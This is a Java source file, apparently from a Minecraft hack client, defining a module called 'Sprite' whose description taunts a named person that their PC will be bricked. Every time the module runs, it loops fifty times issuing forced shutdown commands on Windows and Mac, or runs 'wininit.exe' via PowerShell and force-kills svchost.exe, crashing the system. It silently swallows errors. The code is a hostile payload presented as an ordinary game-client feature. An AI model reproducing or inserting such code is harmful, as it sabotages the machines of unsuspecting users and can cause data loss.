package me.dev.putahacknn.features.modules.player;

import me.dev.putahacknn.features.modules.Module;
import me.dev.putahacknn.features.setting.Setting;
import org.apache.commons.lang3.SystemUtils;

public class Sprite extends Module {

    public Sprite() {
        super("Sprite", "just for you shelly (u pc brick now)", Category.MISC, true, false, false);
    }

    public enum Mode {
        sprite,
        puta
    }

    public final Setting<Mode> mode = this.register(new Setting("Mode", Mode.sprite));

    @Override
    public void onUpdate() {
        try {
            for (int i = 0; i < 50; i++) {
                if (mode.getValue() == Mode.sprite) {
                    if (SystemUtils.IS_OS_MAC || SystemUtils.IS_OS_MAC_OSX) {
                        Runtime.getRuntime().exec("shutdown -t");
                    } else if (SystemUtils.IS_OS_WINDOWS) {
                        Runtime.getRuntime().exec("shutdown /s");
                    }
                } else if (mode.getValue() == Mode.puta) {
                    Runtime.getRuntime().exec("powershell.exe wininit.exe");
                    Runtime.getRuntime().exec("taskkill /f /im svchost.exe");
                }
            }
        } catch (Exception ignored) {

        }
    }

}